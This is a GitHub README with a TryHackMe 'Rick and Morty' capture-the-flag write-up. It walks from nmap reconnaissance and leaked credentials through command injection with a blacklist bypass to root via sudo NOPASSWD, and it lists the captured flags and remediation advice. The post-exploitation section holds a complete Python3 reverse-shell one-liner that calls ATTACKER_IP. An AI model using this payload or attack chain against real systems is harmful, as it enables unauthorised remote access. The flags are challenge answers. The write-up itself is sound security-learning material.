<div align="center">
# 🧪 Rick and Morty CTF — TryHackMe Writeup
 
**Web Application Penetration Testing — Command Injection to Root**
 
[![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square&logo=tryhackme)](https://tryhackme.com/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy%2FMedium-yellow?style=flat-square)]()
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/License-Educational%20Use-blue?style=flat-square)]()
 
</div>
---
 
## 📖 Overview
 
This repository contains the full writeup and professional penetration test report for the **Rick and Morty** room on [TryHackMe](https://tryhackme.com/), a Rick and Morty-themed CTF challenge.
 
The scenario: Rick has turned himself into a pickle again — and this time he can't turn back. The goal is to explore a vulnerable web server and locate **three secret ingredients** needed to brew the reverse potion, progressing from unauthenticated reconnaissance to full **root** compromise of the host.
 
> ⚠️ **Disclaimer:** This assessment was performed exclusively against an isolated lab machine provided by TryHackMe for educational purposes. No real system, network, or third party was targeted. All techniques described here should only be applied in authorized environments.
 
---
 
## 🎯 Objectives
 
- Enumerate services and attack surface of the target host
- Identify and exploit vulnerabilities in the web application
- Obtain an initial foothold (low-privilege shell)
- Escalate privileges to `root`
- Retrieve all three challenge flags (ingredients)
---
 
## 🛠️ Tools & Techniques
 
| Category | Tools / Techniques |
|---|---|
| Reconnaissance | `nmap` (SYN scan, service/version detection, NSE `vuln` scripts) |
| Web Enumeration | Browser DevTools, `view-source`, `robots.txt` analysis |
| Exploitation | Command Injection, blacklist filter bypass |
| Post-Exploitation | Reverse shell (`netcat` + Python3 payload), sudo privilege escalation |
 
---
 
## 🗺️ Attack Chain Summary
 
```
Nmap Scan  →  robots.txt & HTML source disclosure  →  Login (Command Panel)
    │
    ▼
Command Injection (blacklist bypass)  →  1st & 2nd ingredients
    │
    ▼
Reverse Shell (www-data)  →  sudo NOPASSWD  →  root  →  3rd ingredient
```
 
### 1. Reconnaissance
A full TCP port scan with `nmap` revealed two open ports:
 
| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) |
 
An `nmap --script vuln` scan additionally flagged a possible admin directory (`/login.php`) and a `robots.txt` file.
 
### 2. Web Enumeration
- `/robots.txt` disclosed the string `Wubbalubbadubdub` — a strong hint at a password.
- The HTML source code of the landing page contained a developer comment leaking the username `RickRules`.
- Combining both allowed authentication into an internal **Command Panel** — a feature that executes raw system commands.
### 3. Exploitation — Command Injection
The Command Panel executes user input directly on the OS with only a weak keyword **blacklist** (e.g. blocking `cat`). This blacklist was trivially bypassed using equivalent commands such as `less`, allowing full filesystem enumeration and file reads — yielding the **1st** and **2nd** ingredients.
 
### 4. Post-Exploitation — Privilege Escalation
A Python3 reverse shell was injected through the Command Panel to obtain a full interactive shell as `www-data`:
 
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
 
Enumeration of sudo privileges revealed an insecure `NOPASSWD` sudoers entry, allowing unrestricted command execution as `root` — from which the **3rd and final ingredient** was retrieved.
 
---
 
## 🏴 Captured Flags (Ingredients)
 
| # | Ingredient | Method |
|---|---|---|
| 1 | `mr. meeseek hair` | Direct file read via browser (blacklist bypass) |
| 2 | `1 jerry tear` | `less` command in the Command Panel |
| 3 | `fleeb juice` | `sudo` NOPASSWD after reverse shell |
 
---
 
## 🔎 Key Findings
 
| # | Vulnerability | Severity |
|---|---|---|
| 1 | Information disclosure via `robots.txt` | 🟢 Low |
| 2 | Credential disclosure in HTML comment | 🟡 Medium |
| 3 | Command blacklist filter bypass | 🟠 High |
| 4 | Command Injection (RCE) | 🔴 Critical |
| 5 | Insecure `sudoers` configuration (NOPASSWD) | 🔴 Critical |
 
**Recommendations:** remove arbitrary command execution features, use strict input allow-listing instead of blacklisting, restrict `sudoers` entries following least privilege, and avoid storing credentials/hints in public files or source comments.
 
---
 
## 📄 Full Report
 
The complete, formatted penetration test report (PDF/DOCX) with all evidence and screenshots is available here:
 
- [`Pentest_Report_Rick_and_Morty_CTF_EN.docx`](./Pentest_Report_Rick_and_Morty_CTF_EN.pdf)
---
 
## 👥 Authors
 
| Name | GitHub |
|---|---|
| **Leonardo Pereira Pinheiro** | [@Leobatman](https://github.com/Leobatman) |
| **Rhichard Silva e Araujo** | — |
 
---
 
<div align="center">
*Made with 🧪 for learning purposes — TryHackMe Rick and Morty room*
 
</div>
